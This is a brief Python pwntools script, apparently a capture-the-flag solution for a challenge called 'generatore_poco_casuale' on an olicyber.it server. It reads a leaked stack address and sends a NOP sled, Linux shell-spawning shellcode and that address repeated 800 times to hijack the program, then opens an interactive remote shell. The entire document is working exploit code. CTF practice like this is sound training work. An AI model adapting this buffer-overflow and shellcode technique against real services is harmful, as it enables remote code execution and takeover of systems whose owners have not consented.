from pwn import *

context.arch = "amd64"

SHELLCODE = asm(shellcraft.amd64.linux.sh())

# io = process("./generatore_poco_casuale")
r = remote("gpc.challs.olicyber.it", 10104)

r.recvuntil(b": ")
leak = p64(int(r.recvline().strip().decode()) + 1)

payload = b"s" + b"\x90" * 7 + SHELLCODE + leak * 800

r.sendlineafter(b"(s/n)", payload)
r.sendlineafter(b"(s/n)", b"s")
r.interactive()
